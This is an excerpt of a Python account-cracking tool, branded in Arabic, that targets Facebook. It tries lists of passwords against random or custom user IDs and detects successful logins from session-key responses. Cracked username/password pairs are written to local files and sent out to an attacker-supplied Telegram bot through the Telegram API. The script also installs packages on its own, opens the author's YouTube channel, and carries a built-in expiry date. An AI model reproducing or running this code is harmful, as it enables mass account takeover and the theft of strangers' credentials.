...
import webbrowser
webbrowser.open(f'https://www.youtube.com/@V_SV_X')
import os
try:
	import requests
except ImportError:
	os.system("pip install requests")
import datetime;now = datetime.date.today();target = datetime.date(2025,5,20)
if now >=target:exit(" تم ايقاف الاداة ارسل للمطور القيادةابووطن  @V_SV_X")
W = '\033[97;1m'
R = '\033[91;1m'
G = '\033[92;1m'
Y = '\033[93;1m'
...
output = render(' ', colors=['green', 'red'], align='center')
print(output)
token=input('\033[96;1m[-] INPUT TOKEN : ')
ID=input('[-] INPUT ID : ')
rd = requests.get('https://api.telegram.org/bot' + str(token) + '/sendMessage?chat_id=' + str(ID) + '&text= ❖ - تم تشغيل الاداه بنجاح \n ❖ - تم تشغيل البوت بنجاح \n ❖ - انتضر الصيد يوصل هون علبوت \n ❖ - قناتي @V_XR_N للتواصل @V_SV_X: ').text
import sys,time
def print_slow(s):
  for c in s + '\n':
    sys.stdout.write(c)
...
##BlackTiger-Error404##BlackTiger-Error404##BlackTiger-Error404##BlackTiger-Error404##BlackTiger-Error404
...
class Main:
	def __init__(self):
		...
		print(logo)
		print('''
────────────────────────────────────────────────────────────\n\x1b[1;32m(\x1b[1;35m+\x1b[1;32m) \x1b[1;33m Telegram\x1b[1;35m | \x1b[1;32m @V_SV_X \x1b[1;35m (\x1b[1;32m+\x1b[1;35m) \x1b[1;33m Telegram \x1b[1;35m | \x1b[1;32m@S_VS_X\n\x1b[1;────────────────────────────────────────────────────────────   ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀ ''')
		print(f'''
    _    ____  _   ___        ___  _____  _    _   _ 
   / \  | __ )| | | \ \      / / \|_   _|/ \  | \ | |
  / _ \ |  _ \| | | |\ \ /\ / / _ \ | | / _ \ |  \| |
 / ___ \| |_) | |_| | \ V  V / ___ \| |/ ___ \| |\  |
/_/   \_\____/ \___/   \_/\_/_/   \_\_/_/   \_\_| \_|
		...
		sky = '''
    ⠀⠀
\n[bold green][01] Clone Random UID 2011 - 2015\n[02] Clone Random UID 2009 - 2010\n[03] Clone Random UID 2007 - 2008\n[04] Clone Random UID 2005 - 2006\n[07] Email Cloning\n[08] Clone Random UID Custom\n[00] Exit [/bold green]'''
		sky2 = nel(sky, style='green')
		sky2 = nel(sky, style='green')
		cetak(nel(sky2,title='[bold green]    [/bold green]'))
	...
	def api(self, uid, pwx):
		...
		sys.stdout.write(
			"\r \x1b[1;97m\x1b[1;41m 𓆩⏤͟͞𝗔𝗕𝗨𝗪𝗔𝗧𝗔𝗡𓆪 .. \x1b[0m\x1b[1;91m\x1b[1;47m %s|%s \x1b[0m\x1b[1;97m\x1b[1;42m 𝐎𝐊:%s \x1b[0m\x1b[1;97m\x1b[1;41m 𝐂𝐏:%s \x1b[0m "%(self.loop, len(self.id), len(self.cp), len(self.ok))
		); sys.stdout.flush()
		for pw in pwx:
			pw = pw.lower()
			...
			if "session_key" in response.text and "EAAA" in response.text:
				print(f"\033[31m\n___________________________________________________________\n|\n|\x1b[1;93m ♰ - 𝗨𝗦𝗘𝗥𝗡𝗔𝗠  \x1b[38;5;208m : %s   \x1b[95m♰ - 𝗣𝗔𝗦𝗦𝗪𝗥𝗗 \x1b[38;5;208m : %s  \x1b[38;5;255m[%s]\n\033[32m|__________________________________________________________\n"%(uid, pw))
				print ("\r \033[0;92m Congrats Bro ")
				self.ok.append("%s|%s"%(uid, pw))
				open("OK.txt","a").write(" %s|%s\n"%(uid, pw))
				break
			elif "www.facebook.com" in response.json()["error_msg"]:
				print('\n\033[32m___________________________________________________________\n|\n|\x1b[1;93m ♰ - 𝗨𝗦𝗘𝗥𝗡𝗔𝗠  \x1b[38;5;208m : %s   \x1b[95m♰ - 𝗣𝗔𝗦𝗦𝗪𝗥𝗗 \x1b[38;5;208m : %s \n\033[32m|__________________________________________________________\n'%(uid, pw))
				tlg = f'''\n\n⋘────𓆩⏤͟͞𝗔𝗕𝗨𝗪𝗔𝗧𝗔𝗡𓆪──━⋙  \n ♰ - 𝗨𝗦𝗘𝗥𝗡𝗔𝗠 ׀ {uid}\n♰ - 𝗣𝗔𝗦𝗦𝗪𝗥𝗗 ׀ {pw}\n♰ - 𝗟𝗜𝗡𝗞 𝗔𝗟𝗖𝗖𝗢𝗨𝗡𝗧׀ https://www.facebook.com/profile.php?id={uid}\n⋘────𓆩⏤͟͞𝗔𝗕𝗨𝗪𝗔𝗧𝗔𝗡𓆪───━⋙ \n: OK <| ⊊𝗕𝗬⊋ ➩ = @V_SV_X ♕ @V_XR_N	\n
'''
				requests.get('https://api.telegram.org/bot'+str(token)+'/sendMessage?chat_id='+str(ID)+'&text='+str(tlg))
				self.cp.append("%s|%s"%(uid, pw))
				open("abdo-OK.txt","a").write(" %s | %s\n"%(uid, pw))
				break
			else:
				continue
